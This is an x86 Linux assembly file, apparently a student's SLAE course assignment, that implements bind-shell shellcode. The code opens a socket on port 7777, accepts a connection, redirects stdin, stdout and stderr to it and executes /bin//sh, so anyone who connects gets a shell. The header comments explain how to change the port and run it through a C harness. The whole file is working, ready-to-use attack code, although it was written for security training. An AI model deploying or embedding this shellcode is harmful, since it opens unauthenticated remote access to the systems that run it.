; SLAE Assignement 1
; Ben Chase
; Student ID SLAE - 860
; License:  Creative Commons
; This is the assembly that generated the shellcode in shconfig.py
; To customize the port used, run shconfig.py -p <port number> then insert output in shellcode.c, compile and run.

global _start

section .text

        _start:
                push 0x66
                pop eax
                push 0x1
                pop ebx                 ; Socketcall - Socket() register setup

                xor esi,esi
                push esi
                push ebx
                push 0x2                ; End of socket() parameters
                mov ecx, esp            ; Pointer to socket parameters
                int 0x80                ; Should return a socket FD in EAX

                xor edi, edi            ; Clear any stale value out of edi
                xchg edi, eax           ; Save the socket FD

                push 0x66
                pop eax
                push 0x2
                pop ebx                 ; Socketcall - Bind() register setup

                xor ecx, ecx
                push ecx
                push word 0x611e        ; Port 7777 in byte order
                push word bx            ; Should be 0x2
                mov ecx, esp            ; Pointer to sockaddr structure
                push 0x10               ; 16 bytes
                push ecx                ; Pointer to sockaddr
                push edi                ; Socket FD
                mov ecx, esp
                int 0x80                ; Bind that socket.  Dooooo it....

                mov al, 0x66
                mov bl, 0x4             ; Socketcall - Listen() register setup

                xor ecx, ecx
                push ecx
                push edi
                mov ecx, esp            ; Pointer to listen() parameters
                int 0x80                ; Bound socket should be now in a listen() state

                mov al, 0x66
                mov bl, 0x5             ; Socketcall - Accept() register setup

                xor ecx, ecx
                push ecx
                push ecx
                push edi                ; Accept() parameters
                mov ecx, esp            ; Pointer to parameters for socketcall
                int 0x80                ; Accept() call to accept new connections

                xchg ebx, eax           ; Save client FD
                xor ecx, ecx            ; Clear any stale values present in ecx
                mov cl, 0x2             ; One for stdin, stdout, stderr
        looper:
                mov al, 0x3f            ; Dup2() syscall
                int 0x80
                dec ecx                 ; Current value of ecx should match FD for either
                                        ; STDIN, STDOUT, STDERR.
                jns looper
                                        ; At this point the socket should be redirected to
                                        ; STDIN, STDOUT, STDERR.

                mov al, 0x0b            ; Execve() syscall
                xor ecx, ecx
                push ecx                ; Terminating Null byte

                push 0x68732f2f
                push 0x6e69622f

                mov ebx, esp            ; Pointer to the encoded /bin//sh
                xor ecx, ecx
                xor edx, edx
                int 0x80


